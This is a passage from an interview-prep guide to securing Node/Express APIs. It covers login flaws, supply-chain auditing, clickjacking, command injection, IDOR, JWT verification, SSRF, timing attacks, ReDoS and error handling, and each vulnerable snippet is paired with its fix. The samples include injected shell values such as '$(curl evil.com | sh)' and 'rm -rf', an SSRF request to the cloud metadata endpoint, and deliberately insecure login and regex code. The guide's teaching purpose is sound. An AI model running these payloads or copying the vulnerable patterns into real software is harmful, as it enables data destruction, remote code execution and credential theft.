| `X-Content-Type-Options: nosniff` | Stops MIME-type sniffing (a sniffed `text/plain` becoming executable script) |
| `X-Frame-Options` / CSP `frame-ancestors` | Prevents your site being framed → **clickjacking** defense |
| `Referrer-Policy` | Limits how much URL info leaks in the `Referer` header |
| `X-Powered-By` (removed) | Hides that you run Express, reducing fingerprinting |

The single most valuable one to discuss is **CSP**: a well-crafted Content-Security-Policy can neutralize entire classes of XSS by refusing to execute inline or third-party scripts. It's also the hardest to configure correctly, which is why helmet ships a conservative default you must tune.

> BEST PRACTICE: Call `app.disable("x-powered-by")` (helmet does this for you) and build a CSP incrementally using report-only mode (`Content-Security-Policy-Report-Only`) to find violations before enforcing.

> Follow-up: "Does helmet protect against CSRF or SQL injection?" (No — those are app-logic concerns. Helmet only sets headers that influence *browser* behavior.)

---

### 20. **Spot the vulnerability: what's wrong with this login code, and how do you fix it?**

```js
// Given snippet:
app.post("/login", async (req, res) => {
  const user = await User.findOne({ email: req.body.email });
  if (!user) return res.status(404).json({ error: "User not found" });
  if (user.password === req.body.password) {        // (A)
    const token = jwt.sign({ id: user.id }, "secret123"); // (B)
    res.json({ token });
  } else {
    res.status(401).json({ error: "Wrong password" });    // (C)
  }
});
```

Multiple serious issues — naming them all is what scores points:

1. **(A) Plaintext password comparison** — passwords are clearly stored unhashed (and compared with `===`). Fix: store a bcrypt/argon2 hash and verify with `bcrypt.compare`, which is also *constant-time* (a `===` on secrets leaks timing).
2. **(B) Hard-coded, weak JWT secret in source** — `"secret123"` is committed and guessable. Fix: a long random secret from `process.env.JWT_SECRET`, plus `{ expiresIn: "15m" }` so tokens don't live forever.
3. **(C) User enumeration** — returning `404 "User not found"` vs `401 "Wrong password"` lets an attacker discover which emails are registered. Fix: return one generic message ("Invalid credentials") with the same status for both cases.
4. **No rate limiting** — the endpoint invites brute-force/credential-stuffing. Fix: add a strict `express-rate-limit` on `/login`.
5. **No input validation** — `req.body.email` could be an object (NoSQL injection, see Q14). Fix: validate that fields are strings.

```js
const loginLimiter = rateLimit({ windowMs: 15 * 60 * 1000, max: 5 });

app.post("/login", loginLimiter, async (req, res) => {
  const { email, password } = req.body;
  if (typeof email !== "string" || typeof password !== "string") {
    return res.status(400).json({ error: "Invalid input" });  // type validation
  }
  const user = await User.findOne({ email });
  // Always run a compare to avoid timing-based user enumeration; generic error.
  const ok = user && (await bcrypt.compare(password, user.passwordHash));
  if (!ok) return res.status(401).json({ error: "Invalid credentials" }); // uniform
  const token = jwt.sign({ sub: user.id }, process.env.JWT_SECRET, { expiresIn: "15m" });
  res.json({ token });
});
```

> Follow-up: "Why compare even when the user doesn't exist?" (To keep response time uniform — otherwise the timing difference between 'no user' and 'wrong password' leaks which emails exist.)

---

### 21. **How do you keep dependencies secure, and why does it matter (OWASP A06)?**

Most of the code in a typical Node app is *not yours* — it's in `node_modules`. A single vulnerable or malicious transitive dependency can compromise the whole app, so supply-chain security is a first-class concern (OWASP **A06: Vulnerable and Outdated Components**).

Practices:

1. **`npm audit`** — scans your dependency tree against the advisory database; `npm audit fix` applies safe upgrades. Run it in CI and fail the build on high/critical findings.
2. **Automated dependency updates** — Dependabot / Renovate open PRs for new versions and security patches.
3. **Lockfiles + `npm ci`** — commit `package-lock.json` and install with `npm ci` for reproducible, tamper-evident installs.
4. **Pin and review** — be cautious with `latest`, review new dependencies (downloads, maintenance, maintainers) before adding them; minimize the dependency count.
5. **Watch for supply-chain attacks** — typosquatting, hijacked packages, and malicious post-install scripts. Consider `--ignore-scripts` and tools like Socket/Snyk for deeper analysis.

```bash
npm audit                 # report known vulnerabilities
npm audit --omit=dev      # focus on production deps
npm audit fix             # auto-apply non-breaking fixes
npm ci                    # reproducible install strictly from the lockfile
```

> WARNING — Pitfall: `npm audit` reports vulnerabilities even in *dev-only* or unreachable code paths, producing noise. Don't blindly `npm audit fix --force` — it can install breaking major versions. Triage by reachability and severity.

> BEST PRACTICE: Treat `package-lock.json` as security-critical, automate scanning in CI, keep dependencies few and current, and have a process to respond fast when a CVE drops in something you use.

---

### 22. **What is clickjacking, and how do you prevent it?**

**Clickjacking** (UI redress) tricks a user into clicking something different from what they perceive. The attacker loads *your* site in an invisible/transparent `<iframe>` over their own page, then overlays decoy UI; the victim thinks they're clicking the attacker's button but actually clicks your "Transfer money" or "Delete account" control — with their real, authenticated session.

The defense is to tell the browser your site may not be framed by other origins:

- **`Content-Security-Policy: frame-ancestors`** — the modern, preferred control; specify which origins (if any) may frame you. `frame-ancestors 'none'` forbids all framing.
- **`X-Frame-Options: DENY` (or `SAMEORIGIN`)** — the older header, still useful for legacy browsers.

```js
const helmet = require("helmet");
app.use(helmet()); // sets X-Frame-Options: SAMEORIGIN by default

// Modern, more flexible: CSP frame-ancestors.
app.use(helmet.contentSecurityPolicy({
  directives: { frameAncestors: ["'none'"] }, // no one may iframe this site
}));
```

> TIP: `frame-ancestors` supersedes `X-Frame-Options` and lets you allowlist multiple specific origins, which `X-Frame-Options` cannot. Set both for maximum browser coverage; CSP wins where supported.

> Follow-up: "How does SameSite cookies relate to clickjacking?" (`SameSite=Strict/Lax` reduces the impact, since the framed actions may not carry the user's cookie cross-site — but `frame-ancestors` is the direct fix.)

---

### 23. **How do you prevent command injection when your Node app must run a shell command?**

**Command injection** occurs when untrusted input is passed into a shell, letting an attacker append their own commands (e.g., `; rm -rf /` or `$(curl evil.com | sh)`). In Node, the danger zone is `child_process.exec` and `execSync`, which run their argument **through a shell** that interprets metacharacters (`;`, `|`, `&`, `$()`, backticks).

```js
const { exec, execFile } = require("node:child_process");

// VULNERABLE: input goes through a shell. filename="x.txt; rm -rf ~"
exec(`convert ${req.query.filename} out.png`); // attacker runs arbitrary commands

// SAFE: execFile/spawn with an ARGUMENT ARRAY and no shell.
// Arguments are passed directly to the program, never parsed by a shell.
execFile("convert", [req.query.filename, "out.png"], (err, stdout) => { /* ... */ });
```

Defenses, in order:

1. **Avoid the shell entirely** — use `execFile` or `spawn` with `{ shell: false }` (the default) and pass arguments as an **array**, so the OS hands them to the program verbatim with no shell parsing.
2. **Prefer native Node APIs** over shelling out (e.g., `fs` instead of `cat`, a library instead of `curl`).
3. **Validate/allowlist** any input that *must* influence a command (e.g., restrict a filename to `[A-Za-z0-9._-]`).
4. **Never build command strings with user input.**

> WARNING — Pitfall: Even `spawn`/`execFile` become injectable if you pass `{ shell: true }` — that reintroduces shell parsing. Keep `shell` off and use the array form.

> Follow-up: "Is path traversal a separate concern here?" (Yes — even without shell injection, an array arg like `../../etc/passwd` can read unintended files; validate/normalize paths too.)

---

### 24. **What is broken access control (OWASP A01), and what's an IDOR? Show a fix.**

**Broken access control** — the #1 OWASP risk — is failing to enforce *what an authenticated user is allowed to do*. The most common concrete form is **IDOR (Insecure Direct Object Reference)**: the app exposes a resource identifier (an id in the URL) and serves the resource **without checking that the requester owns or may access it**.

```js
// VULNERABLE: any logged-in user can read ANY order by guessing/incrementing the id.
app.get("/orders/:id", authenticate, async (req, res) => {
  const order = await Order.findById(req.params.id); // no ownership check!
  res.json(order);
});
// GET /orders/1042 returns someone else's order. Classic IDOR.

// FIXED: scope the query to the authenticated user (object-level authorization).
app.get("/orders/:id", authenticate, async (req, res) => {
  const order = await Order.findOne({ _id: req.params.id, userId: req.user.id });
  if (!order) return res.status(404).json({ error: "Not found" }); // 404, not 403,
  res.json(order);                                                  // to avoid leaking existence
});
```

The fix is **object-level authorization**: every time you fetch a resource by id, verify the current user is allowed to access *that specific object* — typically by scoping the query (`userId: req.user.id`) or checking ownership/role after fetch. Don't rely on the id being "unguessable"; use opaque IDs (UUIDs) as defense-in-depth, but never as the primary control.

> BEST PRACTICE: Deny by default. Enforce authorization on the **server** for every request, check it as close to the data as possible (scoping the query), and centralize policy (e.g., a permissions layer / CASL) rather than scattering ad-hoc `if (role === ...)` checks. Returning `404` for unauthorized-but-existing objects avoids leaking their existence.

> Follow-up: "Why might you return 404 instead of 403 for someone else's resource?" (403 confirms the object exists; 404 hides whether the id is valid at all, reducing enumeration.)

---

## Advanced

### 25. **Walk through the security design of a JWT verification flow. What must the server check, and what are the common pitfalls?**

Verifying a JWT is more than "does it decode?" A correct, secure verification checks several things, and several infamous CVEs came from skipping them.

A proper verification:

```js
const jwt = require("jsonwebtoken");

function verifyAccessToken(token) {
  return jwt.verify(token, process.env.JWT_ACCESS_SECRET, {
    algorithms: ["HS256"],          // (1) PIN the algorithm explicitly
    issuer: "api.example.com",      // (2) validate iss
    audience: "example-web",        // (3) validate aud
    maxAge: "15m",                  // (4) enforce expiry (also via exp claim)
    clockTolerance: 5,              // small leeway for clock skew
  });
}
```

What the server must verify:

1. **Signature** against the correct secret/public key — proves the token wasn't forged or tampered with.
2. **Algorithm is pinned** to an allowlist. The classic attack: an attacker sets the header `alg` to `none` (asking the server to skip verification) or swaps `RS256`→`HS256` to abuse the *public* key as an HMAC secret. **Never trust the token's own `alg` header** — specify `algorithms` explicitly.
3. **Expiry (`exp`)** and optionally `nbf` (not-before) — reject expired tokens.
4. **Issuer (`iss`) and audience (`aud`)** — ensure the token was minted by you, for your service (prevents token reuse across services).
5. **Revocation** if applicable — check a denylist/`jti` for tokens that must be killed early.

Common pitfalls:

- Using `jwt.decode()` (which does **not** verify the signature) where `jwt.verify()` is required.
- Not setting `expiresIn`, creating immortal tokens.
- Putting sensitive data in the (readable) payload.
- A weak/short HMAC secret that can be brute-forced offline.

> WARNING — The `alg: none` and `RS256→HS256 confusion` attacks are the canonical JWT vulnerabilities. Always pass an explicit `algorithms` allowlist to `verify`. Treat the token header as attacker-controlled.

> Follow-up: "When would you use RS256 over HS256?" (RS256/asymmetric lets *other* services verify with a public key without sharing the signing secret — good for distributed/microservice setups and third-party verification.)

---

### 26. **Describe a comprehensive strategy for securing a production Node/Express API. (The "how do you secure an API" question.)**

This is the capstone question; interviewers want a *layered, defense-in-depth* answer organized by category, not a random list of packages. A strong structure:

**1. Transport & infrastructure**
- HTTPS/TLS everywhere; HSTS; redirect HTTP→HTTPS.
- `app.set("trust proxy", ...)` correctly behind a load balancer.
- Run as a non-root user; keep the OS/runtime patched; minimal container images.

**2. Authentication & session management**
- Strong password hashing (bcrypt/argon2id); password policy + breach-list checks.
- Sessions or short-lived JWTs + refresh-token rotation; secure logout/revocation.
- MFA for sensitive accounts; account lockout / throttling on auth endpoints.

**3. Authorization**
- Deny-by-default; object-level authorization on every resource access (prevent IDOR / A01).
- Centralized, role/attribute-based policy; least privilege everywhere (incl. DB accounts).

**4. Input handling**
- Validate all input server-side with schemas (`zod`/`joi`); allowlist over blocklist.
- Parameterized queries / ODM to stop SQL & NoSQL injection; `express-mongo-sanitize`.
- Contextual output encoding to stop XSS; sanitize rich HTML with DOMPurify.
- Limit body size (`express.json({ limit: "10kb" })`) to resist payload DoS.

**5. Browser-facing headers & policy**
- `helmet()` for CSP, HSTS, `nosniff`, `frame-ancestors`, etc.
- Strict CORS allowlist; correct cookie flags (`HttpOnly`, `Secure`, `SameSite`).
- CSRF protection if you use cookie-based auth.

**6. Abuse & availability**
- Rate limiting (Redis-backed) globally + stricter on auth/expensive routes.
- Timeouts, request size caps, and graceful overload handling.

**7. Secrets & config**
- Secrets in env/secret manager, never in code; validated at startup; rotated.
- `NODE_ENV=production`; disable verbose stack traces to clients.

**8. Dependencies & supply chain**
- `npm audit` + Dependabot/Renovate in CI; lockfile + `npm ci`; vet new packages.

**9. Logging, monitoring & response**
- Structured logs (no secrets/PII), audit trails for security events, alerting, and an incident-response plan (OWASP A09).
- Centralized, safe error handling — never leak internals to clients.

```js
// A representative hardened bootstrap.
app.set("trust proxy", 1);
app.use(helmet());
app.use(cors({ origin: ["https://app.example.com"], credentials: true }));
app.use(express.json({ limit: "10kb" }));         // cap body size
app.use(mongoSanitize());                          // strip $ / . from keys
app.use(rateLimit({ windowMs: 15 * 60 * 1000, max: 100 }));
// ... auth, per-route authZ, validation, then routes ...
app.use(centralErrorHandler);                      // no stack traces to clients
```

> TIP: Frame the answer around **defense-in-depth** and **least privilege**, and explicitly note that no single control is sufficient — you assume each layer can fail and design so another catches it. Mentioning logging/monitoring and incident response separates senior from mid-level answers.

---

### 27. **What is timing-safe comparison, and when does a naive `===` create a vulnerability?**

A **timing attack** extracts secret information by measuring how long an operation takes. A naive string comparison like `a === b` (and most byte-by-byte compares) short-circuits on the *first differing byte*. So comparing a user-supplied token against a secret takes slightly longer the more leading bytes match. By measuring response times over many requests, an attacker can recover the secret one byte at a time.

This matters when comparing **secrets supplied by the caller** against stored secrets: API keys, password-reset tokens, HMAC/webhook signatures, CSRF tokens, etc.

```js
const crypto = require("node:crypto");

// VULNERABLE: short-circuits on first mismatch -> timing leak.
if (userToken === storedToken) { /* ... */ }

// SAFE: constant-time comparison (always examines all bytes).
const a = Buffer.from(userToken);
const b = Buffer.from(storedToken);
// Guard length first: timingSafeEqual throws if lengths differ.
const equal = a.length === b.length && crypto.timingSafeEqual(a, b);
```

The fix is `crypto.timingSafeEqual(bufA, bufB)`, which always inspects every byte so the duration is independent of where the first difference is. (For passwords specifically, `bcrypt.compare` already does a constant-time comparison internally — you don't need to add your own.)

> WARNING — Pitfall: `timingSafeEqual` throws if the two buffers have different lengths, and that length check itself can leak length info. For fixed-length secrets (HMACs, hashes) this is fine; for variable-length ones, hash both sides to a fixed length first, then compare.

> Follow-up: "Where in a typical app would you actually need this?" (Verifying webhook signatures like Stripe/GitHub, API key checks, and password-reset/email-verification token checks.)

---

### 28. **How do you prevent ReDoS (Regular Expression Denial of Service), and how does it relate to validation libraries?**

**ReDoS** is a denial-of-service attack that exploits **catastrophic backtracking** in poorly written regular expressions. Certain patterns — typically nested or overlapping quantifiers like `(a+)+`, `(a|a)*`, `(.*)*` — can take *exponential* time on a crafted input. Because Node's regex engine runs on the single event-loop thread, one malicious string can hang the regex for seconds or minutes, **freezing the entire server** for all users.

```js
// VULNERABLE regex: nested quantifiers -> catastrophic backtracking.
const re = /^(a+)+$/;
re.test("aaaaaaaaaaaaaaaaaaaaaaaa!"); // a long "aaaa...!" input hangs the thread

// The classic real-world example: a naive email/whitespace regex like
// /^(\s*)+$/ or overly clever validation patterns from copy-pasted snippets.
```

Defenses:

1. **Avoid risky patterns** — no nested quantifiers `(x+)+`, no `(a|a)*`-style alternations; keep regexes linear. Prefer simple anchored patterns.
2. **Use safe/linear engines or analyzers** — tools like `safe-regex` flag dangerous patterns; the `re2` library (Google RE2) guarantees linear time by design and is a drop-in for untrusted patterns.
3. **Bound input length** before matching, and apply timeouts where possible.
4. **Don't run user-supplied regexes** against attacker-controlled input.

The connection to validation: ironically, **validation regexes** (especially elaborate email/URL/password patterns lifted from the internet) are a common ReDoS source. This is one reason to prefer vetted validators (`validator.js`, `zod`'s built-ins) over hand-rolled regexes, and to keep custom patterns simple and length-bounded.

> WARNING — Pitfall: A single bad regex on a hot path is a self-inflicted DoS. Audit any regex that touches user input, especially ones with `+`, `*`, or `{n,}` nested inside groups.

> Follow-up: "Why is ReDoS especially dangerous in Node specifically?" (Single-threaded event loop — a hanging regex blocks *every* concurrent request, not just the offending one, unlike a multi-threaded server that loses only one worker.)

---

### 29. **Explain the threat model differences when authenticating a mobile app, a SPA, and a third-party server-to-server client.**

Senior security work is about matching the mechanism to the *threat model* — who the attacker is and what they can touch. The same "auth" question has different right answers per client type.

| Client type | Primary threats | Typical approach |
| --- | --- | --- |
| **Browser SPA** | XSS (token theft), CSRF (if cookies) | Short-lived access token in memory + refresh token in `HttpOnly` `SameSite` cookie; CORS allowlist; CSP |
| **Mobile app** | Device theft, insecure local storage, reverse engineering | OAuth2 + PKCE; tokens in OS secure storage (Keychain/Keystore); cert pinning; no embedded secrets |
| **Server-to-server (3rd party)** | Leaked credentials, replay | API keys or OAuth2 **client credentials** grant; mTLS for high assurance; IP allowlists; HMAC-signed requests |

Key reasoning points:

- **Browsers can't keep secrets**, so SPAs use the **Authorization Code + PKCE** flow (no client secret) and must defend against XSS/CSRF that don't exist server-side.
- **Mobile apps are public clients too** — anything shipped in the binary can be extracted, so they also use PKCE and never embed a client secret; the win is OS-level secure storage and cert pinning.
- **Server-to-server clients can hold secrets**, so the **client-credentials** grant or signed requests fit; here the threats shift to secret leakage, replay, and key rotation rather than browser-specific attacks.

> TIP: The phrase interviewers reward is "public client vs confidential client." Browsers and mobile apps are *public* clients (cannot hold a secret) → PKCE; backend services are *confidential* clients → client secret / client-credentials grant.

> Follow-up: "Why PKCE instead of the implicit flow for SPAs?" (The implicit flow returned tokens in the URL fragment — exposed to history, logs, and referrers — and lacked an exchange step; PKCE with the auth-code flow is now the standard, more secure replacement.)

---

### 30. **What is SSRF (OWASP A10), and how do you defend a Node service that fetches user-supplied URLs?**

**SSRF (Server-Side Request Forgery)** tricks your server into making HTTP (or other) requests to a destination the attacker chooses. Since the request originates from *inside* your network, it can reach things the attacker normally can't: internal admin panels, databases, and especially **cloud metadata endpoints** (e.g., `http://169.254.169.254/`) that hand out IAM credentials. SSRF has caused major cloud breaches.

It arises wherever your app fetches a URL influenced by user input — webhooks, "import from URL," link previews, image proxies, PDF generators.

```js
// VULNERABLE: fetches whatever the user gives, including internal addresses.
app.post("/preview", async (req, res) => {
  const data = await fetch(req.body.url); // url=http://169.254.169.254/latest/meta-data/
  res.send(await data.text());            // exfiltrates cloud credentials
});
```

Defenses (layered, because each can be bypassed alone):

1. **Allowlist destinations** — only permit specific hosts/domains the feature actually needs. This is the strongest control.
2. **Block private/reserved ranges** — resolve the hostname and reject `127.0.0.0/8`, `10/8`, `172.16/12`, `192.168/16`, `169.254/16` (link-local/metadata), IPv6 equivalents, and `localhost`. Check *after* DNS resolution.
3. **Defeat DNS rebinding** — resolve the host, validate the IP, then connect to *that resolved IP* (pin it), so the name can't re-point to an internal address between check and fetch.
4. **Disable redirects or re-validate each hop** — an allowed URL can `302` to an internal one.
5. **Restrict protocols** — only `http`/`https`; block `file://`, `gopher://`, etc.
6. **Network egress controls / metadata protection** — firewall outbound traffic and use IMDSv2 to harden cloud metadata.

```js
const dns = require("node:dns/promises");
const net = require("node:net");

async function isSafeUrl(raw) {
  const url = new URL(raw);
  if (!["http:", "https:"].includes(url.protocol)) return false;     // protocol allowlist
  const { address } = (await dns.lookup(url.hostname));              // resolve
  // Reject private/loopback/link-local ranges (simplified).
  if (net.isIP(address) && /^(127\.|10\.|192\.168\.|169\.254\.|::1)/.test(address)) {
    return false;
  }
  return true; // ideally also pin & connect to THIS address to beat rebinding
}
```

> WARNING — Pitfall: Blocklists alone are bypassable (decimal/hex IP encodings, IPv6-mapped IPv4, DNS rebinding, redirects). Combine an **allowlist** with post-resolution IP checks and pinned connections; never trust the raw hostname.

> Follow-up: "What's DNS rebinding and why does it break naive validation?" (The attacker's domain resolves to a safe IP during your check, then re-resolves to an internal IP for the actual connection — so you must validate and connect to the *same* resolved address.)

---

### 31. **How do you handle errors and logging securely, and why is leaking stack traces dangerous?**

Insecure error handling and logging is its own OWASP concern (A09) and a frequent source of information disclosure.

**Two failure modes:**

1. **Over-sharing with clients.** Returning raw stack traces, SQL errors, or internal paths to the caller hands attackers a map of your stack, file layout, library versions, and query structure — accelerating other attacks. In production, send a **generic** error and a correlation id; log the detail server-side only.

2. **Logging the wrong things.** Logs must **never** contain passwords, tokens, full card numbers, session ids, or other secrets/PII — log files leak, get shipped to third-party aggregators, and are read by many people. Redact before logging.

```js
// Centralized error handler: detailed logs, generic client response.
app.use((err, req, res, next) => {
  const id = crypto.randomUUID();
  logger.error({ id, msg: err.message, stack: err.stack }); // full detail SERVER-SIDE
  const isProd = process.env.NODE_ENV === "production";
  res.status(err.status || 500).json({
    error: isProd ? "Internal server error" : err.message, // no stack to client in prod
    reference: id, // user can quote this; you can find the real error in logs
  });
});
```

The flip side of A09 is **insufficient** logging/monitoring: you also need *enough* security-relevant events (failed logins, authz denials, rate-limit triggers, input validation failures) logged and alerted on, so you can detect and investigate an attack in progress.

> BEST PRACTICE: Set `NODE_ENV=production` (Express then hides stack traces in its default error page), use a structured logger (pino/winston) with a redaction allow/denylist, attach correlation ids, and centralize/alert on logs. Balance: log enough to investigate incidents, never enough to leak secrets.

> Follow-up: "What does Express do differently when `NODE_ENV=production`?" (It disables verbose error stack traces in responses, enables view caching, and generally assumes a non-debug posture.)

---

### 32. **Explain Express 4 vs Express 5 differences that affect security and error handling.**

Express 5 (now the current major) changes several behaviors that matter for writing secure, robust handlers:

| Area | Express 4 | Express 5 |
| --- | --- | --- |
| **Async errors** | Rejected promises in handlers were **not** caught — you had to `try/catch` or wrap every async route, or risk an unhandled rejection | An async handler that **rejects** is automatically forwarded to the error middleware (`next(err)`), reducing crash/leak risk |
| **Path/route matching** | Older `path-to-regexp`; some loose wildcard patterns | Upgraded `path-to-regexp`; stricter syntax, named wildcards (`/*splat`), which removes some ReDoS-prone matching |
| **Deprecated/removed APIs** | `res.send(status)`, `app.del()`, `req.param(name)` still around | Several removed/changed, pushing safer explicit APIs |
| **Node baseline** | Older Node | Requires modern Node (18+), so you inherit current security patches |
| **`res.status` validation** | Lax | Stricter validation of status codes |

The security-relevant headline is **automatic async error handling**: in Express 4, a common bug was an `async` route handler that throws/rejects, producing an unhandled promise rejection — at best the request hangs (a soft DoS), at worst the process crashes or a default error leaks details. Teams worked around it with wrappers like `express-async-handler`. Express 5 forwards rejected promises to your error middleware automatically.

```js
// Express 4: this rejection is NOT caught -> unhandled rejection / hang.
app.get("/user/:id", async (req, res) => {
  const u = await User.findById(req.params.id); // if this throws...
  res.json(u);                                  // ...nothing catches it in v4
});

// Express 4 workaround: wrap to forward errors to error middleware.
const wrap = (fn) => (req, res, next) => Promise.resolve(fn(req, res, next)).catch(next);
app.get("/user/:id", wrap(async (req, res) => { /* ... */ }));

// Express 5: the wrapper is unnecessary-rejections auto-forward to next(err).
```

> TIP: Even on Express 5, still write a centralized error-handling middleware (Q31) — automatic forwarding gets the error *to* your handler, but you decide what's safe to return and log.

> Follow-up: "Does Express 5 auto-catch errors thrown in synchronous middleware too?" (Synchronous throws were always caught and routed to error middleware in v4; the v5 improvement is specifically about *rejected promises* from async handlers.)

---

## Rapid-Fire Quick Answers

| Question | One-line answer |
| --- | --- |
| AuthN vs AuthZ? | AuthN = who you are (401); AuthZ = what you may do (403). |
| Why hash, not encrypt, passwords? | Hashing is one-way; you only need to verify, never recover, a password. |
| Why bcrypt/argon2 over SHA-256? | They're deliberately slow + salted + tunable; SHA is too fast to resist cracking. |
| What is a salt? | A unique random value per password that defeats rainbow tables and hash reuse. |
| Sessions vs JWT in one line? | Sessions = stateful, easy revoke; JWT = stateless, scales, but hard to revoke. |
| Is a JWT encrypted? | No — it's signed; the payload is base64 and readable. Never put secrets in it. |
| Where to store a JWT? | Access token in memory; refresh token in an HttpOnly/Secure/SameSite cookie. |
| Cookie flags that matter? | `HttpOnly` (anti-XSS-theft), `Secure` (HTTPS), `SameSite` (anti-CSRF). |
| What stops XSS? | Contextual output encoding + CSP; HttpOnly cookies limit token theft. |
| What stops CSRF? | `SameSite` cookies + CSRF tokens; header-based (Bearer) auth is largely immune. |
| What stops SQL injection? | Parameterized queries / prepared statements — never string-concatenate input. |
| Is MongoDB injection real? | Yes — attacker smuggles operators like `{$ne:null}`; validate types + mongo-sanitize. |
| What is CORS, really? | A browser opt-in to relax same-origin reads; not server-side access control. |
| What triggers a CORS preflight? | Non-simple requests (PUT/DELETE, custom headers, JSON content-type) → an OPTIONS probe. |
| What does helmet do? | Sets secure response headers (CSP, HSTS, nosniff, frame-ancestors, etc.). |
| Most powerful anti-XSS header? | Content-Security-Policy (CSP). |
| Why rate-limit login? | To throttle brute-force/credential-stuffing; key on real IP behind a proxy. |
| OWASP A01 (the #1 risk)? | Broken Access Control — e.g., IDOR; enforce object-level authZ on the server. |
| What is SSRF? | Tricking your server into fetching internal/metadata URLs; allowlist + block private IPs. |
| Validation vs sanitization? | Validate = reject bad input; sanitize/encode = make accepted input safe to use. |
| Where do secrets live? | Env vars / secret manager, never in code or Git; validate at startup; rotate. |
| Why constant-time compare? | A naive `===` leaks timing; use `crypto.timingSafeEqual` for tokens/signatures. |
| What is ReDoS? | A regex with catastrophic backtracking that freezes the single-threaded event loop. |
| Express 5 security win? | Async handler rejections auto-forward to error middleware (no more silent unhandled rejections). |
| First rule of crypto/auth? | Don't roll your own — use vetted libraries (bcrypt, jsonwebtoken, helmet). |
